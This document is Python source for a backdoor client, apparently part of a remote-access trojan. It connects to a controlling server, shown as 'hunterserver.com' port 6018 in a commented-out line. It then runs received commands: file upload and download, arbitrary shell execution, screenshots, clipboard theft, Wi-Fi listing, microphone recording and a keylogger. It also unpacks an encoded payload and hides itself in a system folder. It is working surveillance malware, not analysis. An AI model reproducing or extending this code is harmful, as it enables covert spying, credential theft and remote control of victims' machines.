from client_commands import *
from bkdoor_functions import *
from keylogger import Keylogger
from pathlib import Path
import socket, os, time


def run(host, port):
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            client_socket.connect((host, port))
        except:
            return

        klogger = Keylogger()
        while True:
            command = client_socket.recv()
            if command == "exit":
                break
            elif command == "pwd":
                pwd(client_socket)
            elif command[:2] == "cd":
                try:
                    os.chdir(command[3:])
                except:
                    continue
            elif command == "sysinfo":
                handle_sysinfo_command(client_socket)
            elif command[:8] == "download":
                downloaded_data = send_file_to_server(client_socket, command[9:])
                if downloaded_data.startswith("[!] Error"):
                    continue
            elif command[:6] == "upload":
                uploaded_data = upload(client_socket, command[7:])
                if uploaded_data.startswith("[!] Error"):
                    continue
            elif command == "netstat":
                execute_netstat(client_socket)
            elif command[:4] == "kill":
                kill_process(client_socket, command[5:])
            elif command == "cpl":
                check_admin_privileges(client_socket)
            elif command[:6] == "urldwn":
                downloaded_data = urldownload(client_socket, command[7:])
                if downloaded_data.startswith("[!] Error"):
                    continue
            elif command[:3] == "run":
                execute_program(client_socket, command[4:])
            elif command[:7] == "prt_scr":
                take_screenshot(client_socket)
            elif command == "wifi_lst":
                get_wifi_list(client_socket)
            elif command == "clipboard":
                send_clipboard(client_socket)
            elif command[:21] == "mic_record --duration":
                mic_record(client_socket, command)
            elif command == "keylog start":
                klogger.start()
                socket_send(client_socket, "[+] Keylogger Started.")
            elif command == "keylog stop":
                klogger.stop()
                socket_send(client_socket, "[+] Keylogger Stoped.")
            elif command == "keylog dump":
                data = klogger.get_log()
                socket_send(client_socket, data)
            elif command == "keylog clear":
                klogger.clear_log()
                socket_send(client_socket, "[+] Log Cleared.")
            else:  # * Run Other System Commands
                execute_system_command(client_socket, command)
    except:
        return


def main():
    system_path = "C:\\ProgramData\\" if sys.platform == "win32" else "/usr/local/bin/"

    if Path(os.getcwd()) != Path(system_path):
        extract_encoded()
        makehidden()
    else:
        pass


# if "__main__" == __name__:
#     run(host="hunterserver.com", port=6018)
